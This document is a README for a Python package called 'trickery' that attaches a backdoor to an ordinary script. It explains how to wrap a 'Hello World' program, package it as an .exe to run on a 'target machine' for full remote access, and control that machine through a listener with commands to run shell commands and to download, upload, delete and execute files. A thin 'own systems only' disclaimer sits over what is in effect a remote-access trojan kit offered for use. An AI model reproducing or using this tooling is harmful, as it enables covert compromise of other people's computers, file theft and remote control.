# trickery
To bind a third-party service to a custom code
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
WARNING!!!

The package is for personal and is supposed to be used on your own systems and data only. The author will not be responsible for any illegal activity carried out by the users/community by this module.

#####################################################################################
*How to use it in my code?

Suppose hello.py is your python file and your code in file is- 
-------------------------------------------------------------------------------------
print("Hello World!")
-------------------------------------------------------------------------------------
And you want to embed a backdoor in backdoor in it, so you will use, 
-> trickery.attach_backdoor(host,port,mainFunction,True)
Parse True for ipv6 address
=====================================================================================
from trickery import attach_backdoor
def main():
    print("Hello World!")
trickery.attach_backdoor("127.0.0.1",1234,main)  
=====================================================================================
Then package this program using pyinstaller (.exe file for windows)

Now when the code will be run on a target machine, that system will compromised and will gain you full remote access, however that system should strictly be yours!

*How to control the system ?

In order to send/recieve files and commands you need to bind the host on that IP address that you had specified in the attach_backdoor in hello.py using trickery.listen()-
Suppose your file name be host.py and code - 

=====================================================================================
from trickery import listen
listen("127.0.0.1",1234)
=====================================================================================

Then you will receive incoming from the target machine and this will be displayed 
on the standard output screen of the host.py along with the target ip.
Commands Instructions :
All the commands depending upon the target's operating system, will be executed by entering that command after ">> " on the output of host.py after the target is displayed.
Some other commands defined by the author-
cd - For changing current working directory
for example: cd C:/users
download - To download a file from the target system.
for example: download filename.exe
upload - To upload a file on the target system.
for example: upload filename.exe
delete - to delete a file (not directory) from the target system.
for example - delete filename.exe
execute - to execute a file/command/program which will be running for a longer duration/infinte loop.
for example - execute whatsapp.lnk

************************* END OF THE FILE**************************************
